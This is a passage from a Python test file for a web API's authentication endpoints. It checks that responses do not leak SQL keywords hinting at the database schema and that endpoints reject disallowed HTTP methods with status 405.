        sql_keywords = ["select", "insert", "table", "column", "constraint", "postgresql", "mysql", "sqlite"]

        for keyword in sql_keywords:
            # Allow "table" only if it's part of a normal word
            if keyword == "table":
                continue
            assert keyword not in response_text, (
                f"Response may expose database schema: contains '{keyword}'"
            )

    def test_http_methods_restricted_appropriately(self, api_client, authenticated_client):
        """
        Verify endpoints only accept appropriate HTTP methods.
        """
        # Profile should accept GET, PUT, PATCH but not DELETE
        response = authenticated_client.delete("/api/v1/auth/profile/")
        assert response.status_code == status.HTTP_405_METHOD_NOT_ALLOWED

        # Verify-email should only accept POST
        response = api_client.get("/api/v1/auth/verify-email/")
        assert response.status_code == status.HTTP_405_METHOD_NOT_ALLOWED

        # Deactivate should only accept POST
        response = authenticated_client.get("/api/v1/auth/deactivate/")
        assert response.status_code == status.HTTP_405_METHOD_NOT_ALLOWED
